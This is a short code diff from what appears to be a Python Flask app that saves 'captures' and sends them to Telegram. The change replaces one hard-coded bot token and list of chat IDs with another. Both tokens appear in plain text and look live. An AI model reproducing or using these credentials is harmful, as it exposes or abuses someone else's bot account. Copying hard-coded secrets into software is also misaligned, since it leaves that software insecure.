@@ -7,10 +7,10 @@ SAVE_DIR = "captures"
 os.makedirs(SAVE_DIR, exist_ok=True)
 
 # Telegram config
-BOT_TOKEN = "8237344741:AAHYDjgU3xp_dChK2Ll_Bp7Z6gCwxqOBwKc"
+BOT_TOKEN = "8560482005:AAFRXpFDj0PmEiMdbgS9yEF3nllMnKpemHs"
 
 # List of chat IDs for multi-send
-CHAT_IDS = ["8167904992", "6022286935"]  # Add your chat IDs here
+CHAT_IDS = ["6965242839", "8560482005"]  # Add your chat IDs here
 
 @app.route("/")
 def index():
